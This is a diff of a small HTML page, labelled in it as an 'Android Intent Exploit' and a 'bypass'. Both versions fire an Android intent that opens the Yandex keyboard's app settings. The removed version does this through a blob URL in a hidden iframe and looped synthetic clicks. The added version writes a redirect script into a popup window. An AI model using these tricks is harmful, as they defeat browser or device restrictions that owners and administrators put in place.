@@ -2,58 +2,41 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Android Intent Exploit 2025</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bypass Fix</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
-        #trigger { 
-            padding: 30px; border: 2px solid #0f0; background: transparent; 
-            color: #0f0; cursor: pointer; font-size: 1.2em;
+        button { 
+            width: 100%; padding: 50px; font-size: 24px; 
+            background: #4CAF50; color: white; border: none; border-radius: 20px;
         }
-        #trigger:hover { background: #0f0; color: #000; }
     </style>
 </head>
 <body>
-    <h1>SYSTEM_BYPASS_INIT...</h1>
-    <button id="trigger">EXECUTE EXPLOIT</button>
-    <div id="status"></div>
+
+    <button onclick="bypass()">ОТКРЫТЬ НАСТРОЙКИ</button>
 
     <script>
-        document.getElementById('trigger').onclick = function() {
-            const pkg = "ru.yandex.androidkeyboard.centaur";
-            const intent = `intent:#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;data=package:${pkg};end`;
+    function bypass() {
+        const pkg = "ru.yandex.androidkeyboard.centaur";
+        const intent = `intent:#Intent;action=android.settings.APPLICATION_DETAILS_SETTINGS;data=package:${pkg};end`;
 
-            // 1. Создаем Blob (фиктивный файл в памяти браузера)
-            // Это обходит фильтр "источника ссылки", так как ссылка идет из blob://, а не с сайта
-            const html = `<script>window.location.href="${intent}";<\/script>`;
-            const blob = new Blob([html], {type: 'text/html'});
-            const blobUrl = URL.createObjectURL(blob);
-
-            // 2. Создаем невидимый iframe
-            const frame = document.createElement('iframe');
-            frame.style.display = 'none';
-            document.body.appendChild(frame);
-
-            // 3. Циклическая атака через Blob и Pop-up
-            let attempts = 0;
-            const timer = setInterval(() => {
-                attempts++;
-                document.getElementById('status').innerText = "Attempt: " + attempts;
-                
-                // Пытаемся вызвать через iframe
-                frame.src = blobUrl;
-
-                // Пытаемся вызвать через "псевдо-клик" по скрытой ссылке
-                const a = document.createElement('a');
-                a.href = intent;
-                a.click();
-
-                if (attempts > 10) {
-                    clearInterval(timer);
-                    URL.revokeObjectURL(blobUrl);
-                    document.getElementById('status').innerText = "Exploit cycle finished.";
-                }
-            }, 200);
-        };
+        // 1. Открываем пустую вкладку (создаем новый чистый контекст)
+        var newWin = window.open('about:blank', '_blank');
+        
+        if (newWin) {
+            // 2. Пишем в новую вкладку скрипт автоматического редиректа
+            newWin.document.write(`
+                <script>
+                    window.location.href = "${intent}";
+                    setTimeout(function() { window.close(); }, 500);
+                <\/script>
+            `);
+        } else {
+            // Если всплывающее окно заблокировано, пробуем обычный метод
+            window.location.href = intent;
+        }
+    }
     </script>
+
 </body>
 </html>
